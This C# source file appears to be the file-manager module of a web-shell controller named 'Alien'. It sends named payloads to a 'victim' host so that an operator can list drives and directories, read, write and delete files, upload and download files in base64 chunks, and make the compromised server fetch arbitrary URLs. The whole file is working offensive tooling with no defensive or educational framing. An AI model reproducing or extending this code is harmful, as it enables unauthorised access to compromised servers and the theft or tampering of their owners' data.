using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading.Tasks;

namespace Alien
{
    public class clsfnFileMgr : clsfnBase
    {
        private clsWeb m_web { get; set; }
        public string m_szFolderPath { get; set; }

        public ImageList m_ExtIcon { get; set; }

        public string m_szCurrentPath { get; set; }
        public string m_szHomePath { get; set; }

        public clsfnFileMgr(clsWeb web)
        {
            m_web = web;
            m_szFolderPath = Path.Combine(web.m_victim.m_szPortfolio, "File");

            if (!Directory.Exists(m_szFolderPath))
                Directory.Exists(m_szFolderPath);

            m_ExtIcon = new ImageList();
            m_ExtIcon.ImageSize = new Size(25, 25);
            fnGetExtensionIcon("txt");
        }

        public struct stInit
        {
            public string szCurrentDir;
            public List<string> lsLogicalDrive;
            public bool bUnixLike { get { return !szCurrentDir.Contains(":"); } }
        }

        public struct stEntry
        {
            public bool bIsDirectory;
            public string szEntryPath;
            public string szEntryName { get { return Path.GetFileName(szEntryPath); } }
            public long nSize;
            public string szPriviledge;
            public string szSize { get { return clsTool.fnSizeNormalization(nSize); } }

            public DateTime dtCreationDate;
            public DateTime dtLastModifiedDate;
            public DateTime dtLastAccessedDate;
        }

        public async Task<stInit> fnszInit()
        {
            string[] szData = (await m_web.fnszSendPayload("file_init")).Split('|');
            string szCurrentDir = szData[0];
            List<string> lsDrive = szData[1].Split(',').ToList();

            m_szHomePath = szCurrentDir;

            stInit init = new stInit()
            {
                szCurrentDir = szCurrentDir,
                lsLogicalDrive = lsDrive,
            };

            return init;
        }
        
        public Image fnGetExtensionIcon(string szExtension)
        {
            if (m_ExtIcon.Images.Keys.Contains(szExtension))
            {
                return m_ExtIcon.Images[szExtension];
            }
            else
            {
                string szTmpFilePath = Path.Combine(Path.GetTempPath(), $"{Guid.NewGuid().ToString().Replace("-", "_")}.{szExtension}");
                File.WriteAllText(szTmpFilePath, string.Empty);

                Icon icon = Icon.ExtractAssociatedIcon(szTmpFilePath);
                File.Delete(szTmpFilePath);

                if (icon == null)
                    return m_ExtIcon.Images["txt"];

                m_ExtIcon.Images.Add(icon);
                m_ExtIcon.Images.SetKeyName(m_ExtIcon.Images.Count - 1, szExtension);

                return icon.ToBitmap();
            }
        }

        public async Task<string> fnszCheckPathExists(string szDirPath)
        {
            try
            {
                string szResp = await m_web.fnszSendPayload("file_pathExists", new string[] { szDirPath });
                if (szResp.Contains("ERROR://"))
                    throw new Exception(szResp);

                string[] asResp = szResp.Split('|');
                if (asResp.Length == 1)
                    throw new Exception(szResp);

                if (int.Parse(asResp[0]) == 1)
                    return asResp[1];

                return null;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnszCheckPathExists()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return null;
            }
        }

        public async Task<Image> fnReadImage(string szFilePath)
        {
            szFilePath = szFilePath.Replace("\\", "/");
            string szResp = await m_web.fnszSendPayload("file_image", new string[] { szFilePath });
            if (szResp.Contains("ERROR://"))
            {
                MessageBox.Show(szResp);
                return null;
            }

            Image img = clsTool.fnimgB64strToImage(szResp);
            
            return img;
        }

        public async Task<List<stEntry>> fnleScandir(string szTargetDirPath)
        {
            szTargetDirPath = szTargetDirPath.Replace("\\", "/");
            List<stEntry> l = new List<stEntry>();

            string szResp = await m_web.fnszSendPayload("file_scandir", new string[] { szTargetDirPath });
            if (szResp.Contains("ERROR://"))
            {
                MessageBox.Show(szResp, "fnleScandir()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return l;
            }

            foreach (string szEntry in szResp.Split('|'))
            {
                try
                {
                    string[] aInfo = szEntry.Split('?');
                    string szFileName = clsEzData.fnszB64d2str(aInfo[0]);
                    bool bDir = szFileName.StartsWith("/");

                    szFileName = szFileName.Replace("/", string.Empty);
                    string szFilePath = Path.Combine(szTargetDirPath, szFileName).Replace("\\", "/");
                    if (string.Equals(szFileName, ".") || string.Equals(szFileName, ".."))
                        continue;

                    string szPerm = aInfo[1];
                    long nLength = long.Parse(aInfo[2]);
                    DateTime ctime = DateTime.Parse(aInfo[3]);
                    DateTime mtime = DateTime.Parse(aInfo[4]);
                    DateTime atime = DateTime.Parse(aInfo[5]);

                    stEntry entry = new stEntry()
                    {
                        bIsDirectory = bDir,
                        szEntryPath = szFilePath,
                        nSize = nLength,
                        szPriviledge = szPerm,

                        dtCreationDate = ctime,
                        dtLastModifiedDate = mtime,
                        dtLastAccessedDate = atime,
                    };

                    l.Add(entry);
                }
                catch (Exception ex)
                {
                    //MessageBox.Show(ex.Message);
                }
            }

            m_szCurrentPath = szTargetDirPath;

            return l;
        }

        public async Task<bool> fnbWrite(string szFilePath, string szContent)
        {
            try
            {
                string szResp = await m_web.fnszSendPayload("file_write", new string[] { szFilePath, szContent });
                if (!string.Equals(szResp, "1"))
                    throw new Exception(szResp);

                return true;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnbWrite()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
        }

        public async Task<string> fnszRead(string szFilePath)
        {
            string szContent = await m_web.fnszSendPayload("file_read", new string[] { szFilePath });
            if (szContent.Contains("ERROR://"))
            {
                MessageBox.Show(szContent);
                return szContent;
            }

            return clsEzData.fnszB64d2str(szContent);
        }

        public async Task<bool> fnbNewFolder(string szDirPath)
        {
            try
            {
                string szResp = await m_web.fnszSendPayload("file_newFolder", new string[] { szDirPath });
                if (!string.Equals(szResp, "1"))
                    throw new Exception(szResp);

                return true;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnbNewFolder()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
        }

        public async Task<bool> fnbFileUpload(string szSrcFilePath, string szDstFilePath, int nChunkSize, Action actOnChunkSent = null, Action fnCallback = null)
        {
            try
            {
                using (FileStream fs = File.OpenRead(szSrcFilePath))
                {
                    byte[] abBuffer = new byte[nChunkSize];
                    int nRead = 0;

                    while ((nRead = fs.Read(abBuffer, 0, abBuffer.Length)) > 0)
                    {
                        string szResp = await m_web.fnszSendPayload("file_upload", new string[]
                        {
                            szDstFilePath, //Destination file path.
                            nRead.ToString(), //File object seek offset.
                            Convert.ToBase64String(abBuffer, 0, nRead), //File bytes in base64
                        });

                        if (!string.Equals(szResp, "1"))
                            throw new Exception("Send file chunk error.");

                        if (actOnChunkSent != null)
                            actOnChunkSent();

                        await Task.Delay(10);
                    }

                    if (fnCallback != null)
                        fnCallback();
                }

                return true;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnbFileUpload", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
        }

        public async Task<bool> fnbFileDownload(string szRemoteFilePath, string szLocalFilePath, int nChunkSize, Action actOnChunkRecvived, Action fnCallback = null)
        {
            try
            {
                using (FileStream fs = File.OpenWrite(szLocalFilePath))
                {
                    int nOffset = 0;
                    string szResp = string.Empty;

                    int nCode = 0;
                    string szMsg = string.Empty;

                    do
                    {
                        szResp = await m_web.fnszSendPayload("file_download", new string[]
                        {
                            szRemoteFilePath,
                            nChunkSize.ToString(),
                            nOffset.ToString(),
                        });

                        string[] s = szResp.Split('|');
                        nCode = int.Parse(s[0]);
                        szMsg = s[1];

                        if (actOnChunkRecvived != null)
                            actOnChunkRecvived();

                        if (nCode == 0)
                            throw new Exception(szMsg);
                        else if (nCode == 2)
                            break;

                        byte[] abBuffer = Convert.FromBase64String(szMsg);
                        fs.Write(abBuffer, 0, abBuffer.Length);

                        nOffset += nChunkSize;
                    }
                    while (nCode == 1);

                    if (fnCallback != null)
                        fnCallback();
                }

                return true;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnbFileDownload", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
        }

        public async Task<bool> fnbDelete(string szDestEntry)
        {
            try
            {
                string szResp = await m_web.fnszSendPayload("file_delete", new string[]
                {
                    szDestEntry,
                });

                if (!string.Equals(szResp, "1"))
                    throw new Exception("Delete file failed: " + szDestEntry);

                return true;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnbDelete", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
        }

        public async Task<bool> fnbWGET(string szUrl)
        {
            try
            {
                string szResp = await m_web.fnszSendPayload("file_wget", new string[]
                {
                    szUrl,
                });

                if (!string.Equals(szResp, "1"))
                    throw new Exception("WGET failed.");

                return true;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnbWGET", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
        }
    }
}
